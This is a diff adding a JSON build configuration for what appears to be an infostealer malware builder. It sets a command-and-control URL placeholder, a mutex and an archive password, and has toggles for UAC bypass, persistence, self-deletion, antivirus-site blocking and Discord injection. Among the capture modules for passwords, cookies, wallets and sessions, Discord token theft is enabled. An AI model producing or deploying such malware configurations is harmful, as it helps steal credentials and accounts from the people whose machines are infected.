@@ -1,0 +1,44 @@
+{
+    "settings": {
+        "c2": [
+            0,
+            "https://dfg"
+        ],
+        "mutex": "AOuKpWf0LcfPzktK",
+        "pingme": false,
+        "vmprotect": false,
+        "startup": false,
+        "melt": false,
+        "uacBypass": false,
+        "archivePassword": "blank123",
+        "consoleMode": 0,
+        "debug": false,
+        "pumpedStubSize": 0,
+        "boundFileRunOnStartup": false
+    },
+    "modules": {
+        "captureWebcam": false,
+        "capturePasswords": false,
+        "captureCookies": false,
+        "captureHistory": false,
+        "captureAutofills": false,
+        "captureDiscordTokens": true,
+        "captureGames": false,
+        "captureWifiPasswords": false,
+        "captureSystemInfo": false,
+        "captureScreenshot": false,
+        "captureTelegramSession": false,
+        "captureCommonFiles": false,
+        "captureWallets": false,
+        "fakeError": [
+            false,
+            [
+                "",
+                "",
+                0
+            ]
+        ],
+        "blockAvSites": false,
+        "discordInjection": false
+    }
+}
